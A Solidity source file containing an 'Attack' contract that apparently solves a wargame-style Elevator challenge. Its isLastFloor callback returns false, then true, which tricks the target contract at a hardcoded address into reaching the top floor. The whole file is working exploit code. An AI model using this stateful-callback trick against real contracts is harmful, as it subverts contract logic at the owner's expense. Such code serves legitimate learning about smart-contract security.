// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface IElevator {
  function goTo(uint _to) external;
}

contract Attack {
  IElevator public el = IElevator(0x54A8F5E8c1653a6bBa7FC0F0dd1Db9E637Bd65be);
  bool public switchFlipped =  false;

  function attack() public {
    el.goTo(1);
  }

  function isLastFloor(uint) public returns (bool) {
    if (! switchFlipped) {
      switchFlipped = true;
      return false;
    } else {
      switchFlipped = false;
      return true;
    }
  }
}